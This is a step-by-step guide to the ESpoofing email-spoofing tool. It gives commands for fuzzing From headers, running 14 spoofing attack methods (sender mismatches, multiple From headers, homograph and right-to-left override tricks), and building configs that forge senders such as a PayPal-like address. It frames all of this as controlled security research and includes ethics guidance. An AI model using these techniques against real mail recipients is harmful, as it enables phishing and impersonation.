# Detailed Guide to Using ESpoofing Tool

This comprehensive guide provides detailed, step-by-step instructions for using the ESpoofing tool for email security research in controlled environments.

## Table of Contents
1. [Initial Setup](#1-initial-setup)
2. [Installation](#2-installation)
3. [Basic Usage](#3-basic-usage)
4. [Attack Methods](#4-attack-methods)
5. [Practical Examples](#5-practical-examples)
6. [Troubleshooting](#6-troubleshooting)
7. [Ethical Considerations](#7-ethical-considerations)

## 1. Initial Setup

### Clone the Repository
```bash
# Create a working directory
mkdir -p ~/security_research
cd ~/security_research

# Clone the repository
git clone https://github.com/skamlek/ESpoofing_modified.git
cd ESpoofing_modified
```

### Set Up Python Environment
```bash
# Install Python 3.10 if not already available
sudo apt-get update
sudo apt-get install -y python3.10 python3.10-venv python3.10-dev

# Create a virtual environment
python3.10 -m venv espoofing_venv

# Activate the virtual environment
source espoofing_venv/bin/activate
```

## 2. Installation

### Install Dependencies
```bash
# Install all required packages
pip install -r requirements.txt
```

### Verify Installation
```bash
# Check if the tool is properly installed
python pre_fuzz.py -h
```

Expected output:
```
       o__ __o                                            o__ __o      o                          
       /v     v\                                          /v     v\   _<|>_                        
      />       <\                                        />       <\                               
     _\o____        \o_ __o      o__ __o      o__ __o    \o             o    \o__ __o     o__ __o/ 
          \_\__o__   |    v\    /v     v\    /v     v\    |>_          <|>    |     |>   /v     |  
                \   / \    <\  />       <\  />       <\   |            / \   / \   / \  />     / \ 
      \         /   \o/     /  \         /  \         /  <o>           \o/   \o/   \o/  \      \o/ 
       o       o     |     o    o       o    o       o    |             |     |     |    o      |  
       <\__ __/>    / \ __/>    <\__ __/>    <\__ __/>   / \           / \   / \   / \   <\__  < > 
                    \o/                                                                         |  
                     |                                                                  o__     o  
                    / \                                                                 <\__ __/>                                                                                                  
                                                                                    # Version: 2.0
        
Usage: pre_fuzz.py [options]
Options:
  -h, --help            show this help message and exit
  -r RFC, --rfc=RFC     The RFC number of the ABNF rule to be extracted.
  -f FIELD, --field=FIELD
                        The field to be fuzzed in ABNF rules.
  -c COUNT, --count=COUNT
                        The amount of ambiguity data that needs to be
                        generated according to ABNF rules.
```

## 3. Basic Usage

### Understanding the Configuration
The tool uses YAML configuration files located in the `config/` directory:
- `config.yaml`: Default configuration
- `test_config.yaml`: Safe testing configuration
- `paypal_demo.yaml`: Demo configuration for PayPal-like headers

### Generating Test Samples
```bash
# Generate 5 malformed "From" headers based on RFC 5322
python pre_fuzz.py -r 5322 -f from -c 5
```

This command:
- `-r 5322`: Uses RFC 5322 (Internet Message Format)
- `-f from`: Targets the "From" field
- `-c 5`: Generates 5 test samples

Example output:
```
[DEBUG] [2025-05-22 00:33:56] [pre_fuzz.py:59] b'From:<Alice@a.com\xef\xbf\xbfattack.com>'
[DEBUG] [2025-05-22 00:33:56] [pre_fuzz.py:59] b'From:<Alice@a.com}attack.com>'
[DEBUG] [2025-05-22 00:33:56] [pre_fuzz.py:59] b'From:<\xe2\x80\xaemoc.a@\xe2\x80\xadalice'
[DEBUG] [2025-05-22 00:33:56] [pre_fuzz.py:59] b'From :hr@outlook.com\r\n'
[DEBUG] [2025-05-22 00:33:56] [pre_fuzz.py:59] b'From: hr@outlook.com\r\n'
```

### Listing Available Attack Methods
```bash
# View all implemented attack methods
python spoofing.py --list
```

Example output:
```
[INFO] [2025-05-22 00:34:14] [spoofing.py:103] Name            Description    
[INFO] [2025-05-22 00:34:14] [spoofing.py:104] ----------------------------------------------------------------------------------------------------
[INFO] [2025-05-22 00:34:14] [spoofing.py:108] default         None
[INFO] [2025-05-22 00:34:14] [spoofing.py:108] A1              A1: The Inconsistency between Auth username and Mail From headers.
[INFO] [2025-05-22 00:34:14] [spoofing.py:108] A2.1            A2.1: The Inconsistency between Mail From and From headers, with different username.
[INFO] [2025-05-22 00:34:14] [spoofing.py:108] A2.2            A2.2: The Inconsistency between Mail From and From headers, with different username.
...
```

## 4. Attack Methods

The tool implements 14 different attack methods:

| Method | Description | Command Example |
|--------|-------------|----------------|
| A1 | Auth username vs. Mail From inconsistency | `python spoofing.py -d -m d -t default -a A1 --mail_to test@example.com` |
| A2.1 | Mail From vs. From header inconsistency (username) | `python spoofing.py -d -m d -t default -a A2.1 --mail_to test@example.com --mime_from "sender@domain.com"` |
| A2.2 | Mail From vs. From header inconsistency (domain) | `python spoofing.py -d -m d -t default -a A2.2 --mail_to test@example.com` |
| A3 | Empty Mail From attack | `python spoofing.py -d -m d -t default -a A3 --mail_to test@example.com` |
| A4 | Multiple From headers | `python spoofing.py -d -m d -t default -a A4 --mail_to test@example.com` |
| A5 | Multiple From headers with Sender header | `python spoofing.py -d -m d -t default -a A5 --mail_to test@example.com` |
| A6 | Parsing inconsistencies | `python spoofing.py -d -m d -t default -a A6 --mail_to test@example.com` |
| A7 | Encoding-based attack | `python spoofing.py -d -m d -t default -a A7 --mail_to test@example.com` |
| A8 | Subdomain attack | `python spoofing.py -d -m d -t default -a A8 --mail_to test@example.com` |
| A12.1 | IDN homograph attack (domain) | `python spoofing.py -d -m d -t default -a A12.1 --mail_to test@example.com` |
| A12.2 | IDN homograph attack (username) | `python spoofing.py -d -m d -t default -a A12.2 --mail_to test@example.com` |
| A13 | Missing UI rendering attack | `python spoofing.py -d -m d -t default -a A13 --mail_to test@example.com` |
| A14.1 | Right-to-left override attack (username) | `python spoofing.py -d -m d -t default -a A14.1 --mail_to test@example.com` |
| A14.2 | Right-to-left override attack (domain) | `python spoofing.py -d -m d -t default -a A14.2 --mail_to test@example.com` |

### Command Parameters Explained
- `-d`: Debug mode (shows headers but doesn't send)
- `-m d`: Direct MTA mode
- `-t default`: Use default target configuration
- `-a A2.1`: Specify attack method
- `--mail_to`: Recipient address
- `--mime_from`: Visible sender address in the email

## 5. Practical Examples

### Example 1: Testing A2.1 Attack with Custom Sender
```bash
# Set a custom From address
python spoofing.py -d -m d -t default -a A2.1 --mail_to test@example.com --mime_from "service@company.com"
```

Example output:
```
[INFO] [2025-05-22 00:39:49] [sender.py:289] 
Message Config:
- helo: None
- mail from: default@mail.spoofing.com
- mail to: ['test@example.com']  
- email content:
Content-Type: text/plain; charset="utf-8"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Subject: =?utf-8?q?=5BWarning=5D_Maybe_you_are_vulnerable_to_the_A2_attack!?=
Date: Thu, 22 May 2025 00:39:49 -0400
Message-ID: <174788878983.9049.1194105680071348180@company.com>
From: service@company.com
To: test@example.com
A2.1: The Inconsistency between Mail From and From headers, with different username.
```

### Example 2: Using Custom Configuration
```bash
# Apply the PayPal demo configuration
python config.py -c config/paypal_demo.yaml

# Run with the PayPal configuration
python spoofing.py -d -m d -t default -a A2.1 --mail_to test@example.com
```

### Example 3: Creating Your Own Configuration
Create a new configuration file:

```bash
cat > config/custom_config.yaml << 'EOF'
default:
  subject: "Important Notice"
  body: "This is a test email for security research purposes"

target:
  default:
    username: 'test@example.com'
    host: example.com
    port: 25
    use_tls: False
    use_ssl: False
    debug_level: True

smtp_user:
  default:
    username: test@example.com
    password: testpassword
    host: localhost
    port: 25
    use_tls: False
    use_ssl: False
    debug_level: True

attack:
  A2.1:
    mime_from: "notifications@example-service.com"
    subject: "Account Security Notice"
    body: "This is a demonstration of email header spoofing for security research."
    description: "A2.1: The Inconsistency between Mail From and From headers."
EOF

# Apply the custom configuration
python config.py -c config/custom_config.yaml

# Run with the custom configuration
python spoofing.py -d -m d -t default -a A2.1 --mail_to test@example.com
```

### Example 4: Testing Multiple Attack Methods
Create a script to test multiple methods:

```bash
cat > test_multiple.sh << 'EOF'
#!/bin/bash
source espoofing_venv/bin/activate
cd /path/to/ESpoofing_modified

for attack in A1 A2.1 A3 A4 A6; do
  echo "Testing attack method: $attack"
  python spoofing.py -d -m d -t default -a $attack --mail_to test@example.com
  echo "----------------------------------------"
done
EOF

chmod +x test_multiple.sh
./test_multiple.sh
```

## 6. Troubleshooting

### Connection Timeout Issues
If you encounter connection timeout errors:

```
TimeoutError: [Errno 110] Connection timed out
```

This is expected in sandbox environments. For testing in a real environment:

```bash
# Check if the target mail server is accessible
telnet example.com 25

# Use a local mail server for testing
sudo apt-get install -y postfix
# Configure for local testing only
```

### Dependency Issues
If you encounter dependency problems:

```bash
# Try installing specific versions
pip install numpy==1.21.0
pip install PyYAML==6.0

# Check for compatibility issues
pip check
```

### Debug Mode
Always use debug mode (`-d`) first to see what would be sent without actually sending:

```bash
python spoofing.py -d -m d -t default -a A2.1 --mail_to test@example.com
```

## 7. Ethical Considerations

This tool is designed for security research in controlled environments only. When using this tool:

1. Only test in environments you own or have explicit permission to test
2. Never send spoofed emails to unwitting recipients
3. Follow responsible disclosure practices if you discover vulnerabilities
4. Comply with all applicable laws and regulations
5. Use the knowledge gained to improve email security, not to exploit it

Remember that email spoofing can be used in phishing attacks and other malicious activities. As a security researcher, your goal should be to understand these techniques to build better defenses against them.

---

This guide is provided for educational purposes to understand email security vulnerabilities and how to protect against them.
